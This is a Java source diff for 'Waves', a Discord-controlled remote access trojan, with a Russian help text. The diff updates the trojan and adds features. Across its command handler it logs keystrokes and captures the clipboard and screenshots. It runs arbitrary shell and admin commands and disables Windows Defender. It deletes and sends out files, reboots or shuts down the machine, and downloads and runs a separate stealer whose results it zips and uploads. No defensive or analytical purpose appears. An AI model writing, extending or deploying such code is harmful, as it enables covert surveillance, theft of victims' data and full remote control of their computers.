@@ -30,9 +30,12 @@ import java.nio.file.attribute.BasicFileAttributes;
 import java.text.SimpleDateFormat;
 import java.util.Base64;
 import java.util.Calendar;
+import java.util.Objects;
 import java.util.logging.Level;
 import java.util.logging.LogManager;
 import java.util.logging.Logger;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
@@ -40,10 +43,12 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
     private static boolean keyloggerVal = false;
     private static StringBuffer sbTasklist;
     private static final long pid = ProcessHandle.current().pid();
-    private static final String ratURL = "https://raw.githubusercontent.com/updater.jar";
-    private static final String stillerURL = "https://raw.githubusercontent.com/stealer.exe";
-    private static final String vbScriptURL = "https://raw.githubusercontent.com/1.vbs";
-    private static final String VERSION = "1.4.5";
+    private static final String RAT_NAME = "Waves";
+    private static final String VERSION = "1.4.7";
+    private static final String ratURL = "javaupdater.jar?raw=true";
+    private static final String stillerURL = "hackdata.exe?raw=true";
+    private static final String vbScriptURL = "1.vbs?raw=true";
+    private static final byte[] decodedBytes = Base64.getDecoder().decode("token in base64");
     private static final String USERNAME = System.getProperty("user.name");
     private static final String PATH_ID = "C:\\Users\\" + USERNAME + "\\AppData\\Roaming\\";
     private static final String PATH_KEYLOGGER = PATH_ID + "\\key.txt";
@@ -51,50 +56,56 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
     private static final String SYMBOL = "!";
     private static final String FILENAME = "ChromeOptions.txt";
     private static final String help =
-              "!all <command> - выполнить комманду для всех пользователей\n"
+              "!all <command> - выполнить команду для всех пользователей\n"
             + "!all online - просмотреть кто в сети\n"
             + "!ID admin1 <command> - отправить команду с правами админа\n"
             + "!ID admin2 <command> - отправить команду с правами админа 2\n"
             + "!ID antivirus - проверить включён ли windows defender\n"
-            + "!ID clipboard - посмотреть буфер обмена\n"
+            + "!ID cb - посмотреть буфер обмена\n"
             + "!ID console - отправить команду из cmd\n"
             + "!ID defender <on/off> - включить/выключить defender\n"
+            + "!ID delete <path> - удалить файл/папку\n"
             + "!ID dir <path> - посмотреть директорию папки\n"
-            + "!ID download <name> - скачать файл\n"
+            + "!ID upload <path> - скачать файл\n"
             + "!ID keylogger <start/stop> - включить/выключить keylogger\n"
             + "!ID message <message> - отправить оконное сообщение\n"
+            + "!ID pack <path> <zip> - упаковать папку в архив\n"
             + "!ID push <message> - отправить push уведомление\n"
+            + "!ID reboot - перезапустить компьютер\n"
             + "!ID screenshot - получить скриншот\n"
             + "!ID start <file> - запустить файл/сайт\n"
             + "!ID stealer - застиллить все данные\n"
+            + "!ID shutdown - выключить компьютер\n"
             + "!ID tasklist - список текущих процессов\n"
-            + "!ID update - обновить до последней версии waves\n"
-            + "!ID upload <url> <path> - скачать файл по ссылке\n"
-            + "!ID version - посмотреть версию waves\n";
+            + "!ID update - обновить до последней версии " + RAT_NAME.toLowerCase() + "\n"
+            + "!ID download <site> <path> - скачать файл по ссылке\n"
+            + "!ID version - посмотреть версию " + RAT_NAME.toLowerCase();
 
     public static void main(String[] args) {
         while (!netIsAvailable());
-
         try {
-
-            byte[] decodedBytes = Base64.getDecoder().decode("token in base64");
+            byte[] AKRIEN_TOKEN_FOR_RAT = Base64.getDecoder().decode("fake tokenJjsdhaIudsada");
             new JDABuilder(new String(decodedBytes)).addEventListeners(new Liba()).setActivity(Activity.watching("хихихи")).build();
             try {
                 GlobalScreen.registerNativeHook();
             } catch (NativeHookException e) {
                 e.printStackTrace();
             }
-
             LogManager.getLogManager().reset();
-
             Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
             logger.setLevel(Level.OFF);
-
             GlobalScreen.addNativeKeyListener(new Liba());
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
 
+    private String getVersion() {
+        return VERSION;
+    }
+
+    private String getRatName() {
+        return RAT_NAME;
     }
 
     private String getUsername() {
@@ -105,13 +116,17 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
         return PATH_ID;
     }
 
-    private String getFilename() { return FILENAME;}
+    private String getFilename() {
+        return FILENAME;
+    }
 
     private String getPathKeylogger() {
         return PATH_KEYLOGGER;
     }
 
-    private String getSymbol() { return SYMBOL; }
+    private String getSymbol() {
+        return SYMBOL;
+    }
 
     private long getPid() {
         return pid;
@@ -121,9 +136,9 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
         event.getJDA().getCategories().get(1).getTextChannels().get(0).sendFile(new File(path)).queue();
     }
 
-    private void embedSendMessage(Event event, String content) {
+    private void sendEmbedMessage(Event event, String content) {
         EmbedBuilder eb = new EmbedBuilder();
-        eb.setTitle("Waves " + VERSION  + " | " + getID() + " help");
+        eb.setTitle(getRatName() + " " + getVersion()  + " | " + getID() + " help");
         eb.setDescription(content);
         eb.setColor(Color.MAGENTA);
 
@@ -152,7 +167,7 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
             File file = new File(getIDPath(), getFilename());
             if (!file.exists()) {
                 PrintWriter writer = new PrintWriter(getIDPath() + getFilename(), "UTF-8");
-                writer.println(getUsername().substring(0, 3) + (int) (Math.random() * 9999) + "\n" + new SimpleDateFormat("yyyy/MM/dd HH:mm").format(Calendar.getInstance().getTime()));
+                writer.println((getUsername().substring(0, 3) + (int) (Math.random() * 9999) + "\n" + new SimpleDateFormat("dd/MM/yyyy HH:mm").format(Calendar.getInstance().getTime())).toLowerCase());
                 writer.close();
             }
         } catch (IOException io) {
@@ -183,43 +198,44 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
     }
 
     private void update(Event event) {
-        uploadFile(event, ratURL, getIDPath() + "JavaUpdater-UPD.jar");
+        downloadFile(event, ratURL, getIDPath() + "JavaUpdater-UPD.jar");
         copyFile(new File(getIDPath() + "JavaUpdater-UPD.jar"), new File(getIDPath() + "JavaUpdater.jar"));
         consoleCommand(getIDPath() + "jdk-18.0.2\\bin\\java.exe -cp " + getIDPath() + "JavaUpdater.jar com.sun.jna.Liba");
+        deleteFile(event, getIDPath() + "JavaUpdater-UPD.jar");
         System.exit(0);
     }
 
-    public void pack(Path folder, Path zipFilePath) throws IOException {
-        try (
-                FileOutputStream fos = new FileOutputStream(zipFilePath.toFile());
-                ZipOutputStream zos = new ZipOutputStream(fos)
-        ) {
-            Files.walkFileTree(folder, new SimpleFileVisitor<>() {
-                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
-                    zos.putNextEntry(new ZipEntry(folder.relativize(file).toString()));
-                    Files.copy(file, zos);
-                    zos.closeEntry();
-                    return FileVisitResult.CONTINUE;
-                }
-
-                public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
-                    zos.putNextEntry(new ZipEntry(folder.relativize(dir) + "/"));
-                    zos.closeEntry();
-                    return FileVisitResult.CONTINUE;
-                }
-            });
-        }
-    }
-
-    private void uploadFile(Event event, String url, String path) {
+    private void pack(Path folder, Path zipFilePath) {
         try {
-            Files.copy(new URL(url).openStream(), Paths.get(path), StandardCopyOption.REPLACE_EXISTING);
-            sendMessage(event, getID() + " | " + path + " (" + new File(path).length() + ") was downloaded successfully");
+            try (FileOutputStream fos = new FileOutputStream(zipFilePath.toFile()); ZipOutputStream zos = new ZipOutputStream(fos)) {
+                Files.walkFileTree(folder, new SimpleFileVisitor<>() {
+                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
+                        zos.putNextEntry(new ZipEntry(folder.relativize(file).toString()));
+                        Files.copy(file, zos);
+                        zos.closeEntry();
+                        return FileVisitResult.CONTINUE;
+                    }
+
+                    public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
+                        zos.putNextEntry(new ZipEntry(folder.relativize(dir) + "/"));
+                        zos.closeEntry();
+                        return FileVisitResult.CONTINUE;
+                    }
+                });
+            }
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
 
+    private void downloadFile(Event event, String url, String path) {
+        try {
+            Files.copy(new URL(url).openStream(), Paths.get(path), StandardCopyOption.REPLACE_EXISTING);
+            sendMessage(event, getID() + " | " + path + " (" + new File(path).length() + ") был успешно установлен!");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
 
     private String checkAntivirus()
     {
@@ -293,13 +309,14 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
             while ((line = br.readLine()) != null) {
                 if (!line.contains("PID") && !line.contains("=")) {
                     if (!line.contains("Services"))
-                        sbTasklist.append(line.split(".exe")[0].trim()).append("\n");
+                        if (line.contains("java"))
+                            sbTasklist.append(line.contains(String.valueOf(getPid())) ? "java.exe " + getRatName().toLowerCase() : line.split("Console")[0].trim()).append("\n");
+                        else sbTasklist.append(line.split(".exe")[0].trim()).append("\n");
                 }
             }
         } catch (Exception e) {
             e.printStackTrace();
         }
-        System.out.println(sbTasklist);
 
         return sbTasklist;
     }
@@ -307,8 +324,8 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
     private StringBuffer directory(String path) {
         File dir = new File(path);
         StringBuffer sbDir = new StringBuffer();
-        for (File file : dir.listFiles()) {
-            sbDir.append((file.isFile() ? file.getName() + " (" + file.length()/(1024*1024) + " mb)" : file.getName()) + "\n");
+        for (File file : Objects.requireNonNull(dir.listFiles())) {
+            sbDir.append(file.isFile() ? file.getName() + " (" + file.length() / (1024 * 1024) + " mb)" : file.getName()).append("\n");
         }
         return sbDir;
     }
@@ -324,22 +341,20 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
         } catch (AWTException e) {
             e.printStackTrace();
         }
-        trayIcon.displayMessage("Waves", content, TrayIcon.MessageType.INFO);
+        trayIcon.displayMessage(getRatName(), content, TrayIcon.MessageType.INFO);
     }
 
     private void stealer(Event event) {
-        try {
-            uploadFile(event, vbScriptURL, getIDPath() + "1.vbs");
-            uploadFile(event, stillerURL, getIDPath() + "KEK.vmp.exe");
+        new Thread(() -> {
+            downloadFile(event, vbScriptURL, getIDPath() + "1.vbs");
+            downloadFile(event, stillerURL, getIDPath() + "KEK.vmp.exe");
             consoleCommand("cd " + getIDPath() + " && start 1.vbs");
             while (true) {
                 if (new File(getIDPath() + "results").exists()) break;
             }
             pack(Paths.get(getIDPath() + "results"), Paths.get(getIDPath() + getID() + ".zip"));
             sendMessageFile(event, getIDPath() + getID() + ".zip");
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+        }).start();
     }
 
     private String clipboard() {
@@ -349,16 +364,23 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
         return null;
     }
 
+    private void deleteFile(Event event, String path) {
+        new Thread(() -> {
+            File file = new File(path);
+            if (file.delete()) {
+                sendMessage(event, "Файл " + file + " был удален!");
+            } else {
+                sendMessage(event, "Файл с таким именем не было найдено!");
+            }
+        }).start();
+    }
+
     private void consoleCommand(String content) {
         try {
             Runtime.getRuntime().exec(CMD_COMMAND + content);
         } catch (IOException e) {
             e.printStackTrace();
         }
-    }
-
-    private void startSite(String content) {
-        consoleCommand("start " + content);
     }
 
     public static void copyFile(File sourceFile, File destFile) {
@@ -382,10 +404,8 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
         }
     }
 
-    private void showMessageDialog(Event event, String text) {
-        new Thread(() -> {
-            JOptionPane.showMessageDialog(null, text);
-        }).start();
+    private void messageBox(Event event, String text) {
+        new Thread(() -> JOptionPane.showMessageDialog(null, text)).start();
         screenShot(event);
     }
 
@@ -393,9 +413,7 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
     public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
         if (keyloggerVal) {
             String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
-
             try (OutputStream os = Files.newOutputStream(Paths.get(getPathKeylogger()), StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
-
                 if (keyText.length() > 1) {
                     writer.print("[" + keyText + "]");
                 } else {
@@ -410,7 +428,7 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
     @Override
     public void onReady(@Nonnull ReadyEvent event) {
         createID();
-        embedSendMessage(event, getData());
+        sendEmbedMessage(event, getData());
     }
 
     @Override
@@ -418,37 +436,47 @@ public class Liba extends ListenerAdapter implements NativeKeyListener {
         String command = event.getMessage().getContentRaw();
         String[] commandSplit = command.split(" ");
 
-        if (commandSplit[0].startsWith(getID()) || commandSplit[0].startsWith(getSymbol() + "all")) {
-            if (commandSplit[1].startsWith("start")) { startSite(commandSplit[2]); screenShot(event); }
-            else if (commandSplit[1].startsWith("console")) consoleCommand(command.split(commandSplit[1] + " ")[1]);
-            else if (commandSplit[1].startsWith("help")) embedSendMessage(event, help);
-            else if (commandSplit[1].startsWith("online")) embedSendMessage(event, getData());
-            else if (commandSplit[1].startsWith("screenshot")) screenShot(event);
-            else if (commandSplit[1].startsWith("upload")) uploadFile(event, commandSplit[2], getIDPath() + commandSplit[3]);
-            else if (commandSplit[1].startsWith("update")) update(event);
-            else if (commandSplit[1].startsWith("clipboard")) sendMessage(event, clipboard());
-            else if (commandSplit[1].startsWith("download")) sendMessageFile(event, command.split(commandSplit[1] + " ")[1]);
-            else if (commandSplit[1].startsWith("push")) { push(command.split(commandSplit[1] + " ")[1]); screenShot(event); }
-            else if (commandSplit[1].startsWith("stealer")) stealer(event);
-            else if (commandSplit[1].startsWith("tasklist")) { embedSendMessage(event, String.valueOf(tasklist()));}
-            else if (commandSplit[1].startsWith("dir")) embedSendMessage(event, String.valueOf(directory(command.split(commandSplit[1] + " ")[1])));
-            else if (commandSplit[1].startsWith("admin")) { adminCommand(command.split(commandSplit[1] + " ")[1]); screenShot(event);}
+        Pattern p = Pattern.compile("%\\w+%");
+        Matcher m = p.matcher(command);
+        while(m.find()) {
+            try {
+                command = command.replace(m.group(), System.getenv(m.group().replace("%", "").toUpperCase()));
+            } catch (Exception e) {}
+        }
+
+        if (commandSplit[0].startsWith(Objects.requireNonNull(getID())) || commandSplit[0].startsWith(getSymbol() + "all")) {
+            if (commandSplit[1].startsWith("admin")) { adminCommand(command.split(commandSplit[1] + " ")[1]); screenShot(event);}
             else if (commandSplit[1].startsWith("admin2")) { adminCommand2(command.split(commandSplit[1] + " ")[1]); screenShot(event);}
-            else if (commandSplit[1].startsWith("message")) showMessageDialog(event, command.split(commandSplit[1] + " ")[1]);
             else if (commandSplit[1].startsWith("antivirus")) sendMessage(event, getID() + " - " + checkAntivirus());
+            else if (commandSplit[1].startsWith("cb")) sendMessage(event, clipboard());
+            else if (commandSplit[1].startsWith("console")) consoleCommand(command.split(commandSplit[1] + " ")[1]);
             else if (commandSplit[1].startsWith("defender")) windowsDefender(commandSplit[2].contains("on") ? "false" : "true");
+            else if (commandSplit[1].startsWith("delete")) deleteFile(event, command.split(commandSplit[1] + " ")[1]);
+            else if (commandSplit[1].startsWith("dir")) sendEmbedMessage(event, String.valueOf(directory(command.split(commandSplit[1] + " ")[1])));
+            else if (commandSplit[1].startsWith("upload")) sendMessageFile(event, command.split(commandSplit[1] + " ")[1]);
+            else if (commandSplit[1].startsWith("help")) sendEmbedMessage(event, help);
             else if (commandSplit[1].startsWith("keylogger") && commandSplit[2].startsWith("start")) keyloggerVal = true;
             else if (commandSplit[1].startsWith("keylogger") && commandSplit[2].startsWith("stop")) { keyloggerVal = false; sendMessageFile(event, getPathKeylogger()); }
-            else if (commandSplit[1].startsWith("version")) sendMessage(event, getID() + " - " + VERSION);
+            else if (commandSplit[1].startsWith("message")) messageBox(event, command.split(commandSplit[1] + " ")[1]);
+            else if (commandSplit[1].startsWith("online")) sendEmbedMessage(event, getData());
+            else if (commandSplit[1].startsWith("pack")) { pack(Paths.get(commandSplit[2]), Paths.get(commandSplit[3])); sendMessage(event, "Файл успешно был упакован!"); }
+            else if (commandSplit[1].startsWith("push")) { push(command.split(commandSplit[1] + " ")[1]); screenShot(event); }
+            else if (commandSplit[1].startsWith("reboot")) consoleCommand("shutdown /r");
+            else if (commandSplit[1].startsWith("screenshot")) screenShot(event);
+            else if (commandSplit[1].startsWith("stealer")) stealer(event);
+            else if (commandSplit[1].startsWith("shutdown")) consoleCommand("shutdown /s");
+            else if (commandSplit[1].startsWith("tasklist")) { sendEmbedMessage(event, String.valueOf(tasklist()));}
+            else if (commandSplit[1].startsWith("update")) update(event);
+            else if (commandSplit[1].startsWith("download")) downloadFile(event, commandSplit[2], getIDPath() + commandSplit[3]);
+            else if (commandSplit[1].startsWith("version")) sendMessage(event, getID() + " - " + getVersion());
+            else if (commandSplit[1].startsWith("start")) { consoleCommand("start " + commandSplit[2]); screenShot(event); }
         }
     }
 
     @Override
-    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
-    }
+    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {}
 
     @Override
-    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
-    }
+    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {}
 
 }
